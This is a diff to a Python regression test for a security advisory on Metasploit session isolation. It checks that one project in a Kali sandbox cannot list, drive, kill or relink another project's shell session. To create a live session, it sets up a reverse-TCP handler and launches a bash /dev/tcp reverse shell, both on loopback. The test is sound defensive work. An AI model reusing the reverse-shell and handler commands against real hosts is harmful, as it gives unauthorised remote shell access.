@@ -1,15 +1,19 @@
 """
-Live half of tests/ghsa_w454_msf_lease_live.sh (GHSA-w454-6hwp-fm58): run INSIDE the
-kali-sandbox container, fed on stdin. It starts a second Metasploit server from
+Live half of tests/ghsa_w454_msf_lease_live.sh (GHSA-w454-6hwp-fm58): run INSIDE one
+person's Kali sandbox, fed on stdin. It starts a second Metasploit server from
 $MSF_SERVER_DIR on loopback ports (18003 MCP, 18013 session manager) with its own real
-msfconsole and a 20 s idle window, so the stack's own console is never touched, then
-plays the advisory through the console instead of the routes:
+msfconsole and a 20 s idle window, so the sandbox's own console is never touched, then
+plays the advisory through the console instead of the routes.
 
-  Alice (project-alice) opens a handler job and a real shell session on loopback; Bob
-  (project-bob) asks for `sessions -l`, `sessions -c "id" -i 1`, `irb`, `sessions -K`,
-  `jobs -K` and msf_restart, and forges the session's chat link. Each must be refused
-  and Alice's session must survive, while Alice still drives it. When Alice is done and
-  idle, Bob gets a restarted console and Alice is the one refused.
+A sandbox's console serves every project its person may use: their own and those shared
+with them, which hold other tenants' data. So the two players are two projects of that
+one person, as the agent stamps them:
+
+  Project A opens a handler job and a real shell session on loopback; project B asks for
+  `sessions -l`, `sessions -c "id" -i 1`, `irb`, `sessions -K`, `jobs -K` and
+  msf_restart, and forges the session's chat link. Each must be refused and A's session
+  must survive, while A still drives it. When A is done and idle, B gets a restarted
+  console and A is the one refused.
 
 Tokens and command output are never printed; each check prints PASS or FAIL. A server
 whose tools take no `_redamon_owner` (the code before the fix) is called without one,
@@ -32,8 +36,10 @@ TOKEN = os.environ["MCP_AUTH_TOKEN"]
 SERVER_DIR = os.environ.get("MSF_SERVER_DIR", "/opt/mcp_servers")
 MCP_PORT, HTTP_PORT, LPORT = 18003, 18013, 4455
 IDLE_S = 20
-ALICE = {"project_id": "project-alice", "user_id": "alice", "chat_session_id": "chat-alice"}
-BOB = {"project_id": "project-bob", "user_id": "bob", "chat_session_id": "chat-bob"}
+# One person (the sandbox's), two of their projects: the lease is per project.
+PERSON = "w454-person"
+PROJECT_A = {"project_id": "w454-project-a", "user_id": PERSON, "chat_session_id": "chat-a"}
+PROJECT_B = {"project_id": "w454-project-b", "user_id": PERSON, "chat_session_id": "chat-b"}
 
 LAUNCH = """
 import os, sys
@@ -116,9 +122,9 @@ async def scenario():
         for command in ("use exploit/multi/handler", "set payload generic/shell_reverse_tcp",
                         "set LHOST 127.0.0.1", f"set LPORT {LPORT}", "set ExitOnSession false",
                         "exploit -j"):
-            await c.msf(ALICE, command)
+            await c.msf(PROJECT_A, command)
         # `exploit -j` answers before msfconsole has bound the handler.
-        check("Alice's handler listens on loopback", bool(wait_for(lambda: _listening(LPORT), 60, 1.0)))
+        check("project A's handler listens on loopback", bool(wait_for(lambda: _listening(LPORT), 60, 1.0)))
         shell = subprocess.Popen(["bash", "-c", f"bash -i >& /dev/tcp/127.0.0.1/{LPORT} 0>&1"],
                                  stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL, start_new_session=True)
@@ -126,46 +132,51 @@ async def scenario():
             data = wait_for(lambda: (lambda d: d if d.get("sessions") else None)(listing()), 90)
             sessions = (data or {}).get("sessions", [])
             sid = sessions[0]["id"] if sessions else 1
-            check("Alice's handler job and real shell session are live",
+            check("project A's handler job and real shell session are live",
                   bool(sessions) and bool((data or {}).get("jobs")))
             if owner_param:
-                check("the console linked the new session to Alice's chat",
-                      bool(sessions) and sessions[0].get("chat_session_id") == "chat-alice")
+                # GET /sessions answers the session manager's cached rows, each carrying the chat link
+                # as it stood at the cache's last refresh: the first listing that shows the session
+                # may predate its link, which a later refresh adds.
+                linked = wait_for(lambda: next((s.get("chat_session_id") for s in listing().get("sessions", [])
+                                                if s.get("id") == sid and s.get("chat_session_id")), None), 30, 1.0)
+                check(f"the console linked the new session to project A's chat -> {linked or 'no link within 30 s'}",
+                      linked == "chat-a")
 
-            check("Bob: `sessions -l` refused", refused(await c.msf(BOB, "sessions -l")))
-            first, both = await c.drive(BOB, sid)
-            check("Bob: `sessions -c id -i <Alice's>` refused, nothing ran",
+            check("project B: `sessions -l` refused", refused(await c.msf(PROJECT_B, "sessions -l")))
+            first, both = await c.drive(PROJECT_B, sid)
+            check("project B: `sessions -c id -i <A's>` refused, nothing ran",
                   refused(first) and "uid=" not in both)
-            check("Bob: `irb` over framework.sessions refused",
-                  refused(await c.msf(BOB, 'irb -e "puts framework.sessions.keys.inspect"')))
+            check("project B: `irb` over framework.sessions refused",
+                  refused(await c.msf(PROJECT_B, 'irb -e "puts framework.sessions.keys.inspect"')))
             status, _ = http("POST", "/session-chat-map",
-                             {"msf_session_id": sid, "chat_session_id": "chat-bob"})
-            check("Bob's forged session link refused (409)", status == 409)
+                             {"msf_session_id": sid, "chat_session_id": "chat-b"})
+            check("project B's forged session link refused (409)", status == 409)
             if owner_param:
                 check("a call naming no project refused",
                       "names no project" in await c.msf(None, "sessions -l"))
 
-            check("Alice still drives her own session", "uid=" in (await c.drive(ALICE, sid))[1])
+            check("project A still drives its own session", "uid=" in (await c.drive(PROJECT_A, sid))[1])
 
-            check("Bob: `sessions -K` refused", refused(await c.msf(BOB, "sessions -K")))
-            check("Bob: `jobs -K` refused", refused(await c.msf(BOB, "jobs -K")))
-            check("Bob: msf_restart refused", refused(await c.call("msf_restart", BOB)))
+            check("project B: `sessions -K` refused", refused(await c.msf(PROJECT_B, "sessions -K")))
+            check("project B: `jobs -K` refused", refused(await c.msf(PROJECT_B, "jobs -K")))
+            check("project B: msf_restart refused", refused(await c.call("msf_restart", PROJECT_B)))
             time.sleep(5)
             alive = listing()
-            check("Alice's session and job survived Bob",
+            check("project A's session and job survived project B",
                   any(s.get("id") == sid for s in alive.get("sessions", [])) and bool(alive.get("jobs")))
 
             if not owner_param:
                 return
-            await c.msf(ALICE, "sessions -K")
-            await c.msf(ALICE, "jobs -K")
+            await c.msf(PROJECT_A, "sessions -K")
+            await c.msf(PROJECT_A, "jobs -K")
             empty = wait_for(lambda: (lambda d: d if not d.get("sessions") and not d.get("jobs") else None)(listing()), 60)
-            check("Alice ended her session and job", empty is not None)
+            check("project A ended its session and job", empty is not None)
             time.sleep(IDLE_S + 5)
-            out = await c.msf(BOB, "sessions -l")
-            check("Bob takes the idle, empty console (restarted for him)",
+            out = await c.msf(PROJECT_B, "sessions -l")
+            check("project B takes the idle, empty console (restarted for it)",
                   not refused(out) and "No active sessions" in out)
-            check("Alice is now the one refused", refused(await c.msf(ALICE, "sessions -l")))
+            check("project A is now the one refused", refused(await c.msf(PROJECT_A, "sessions -l")))
         finally:
             os.killpg(shell.pid, signal.SIGKILL)
 
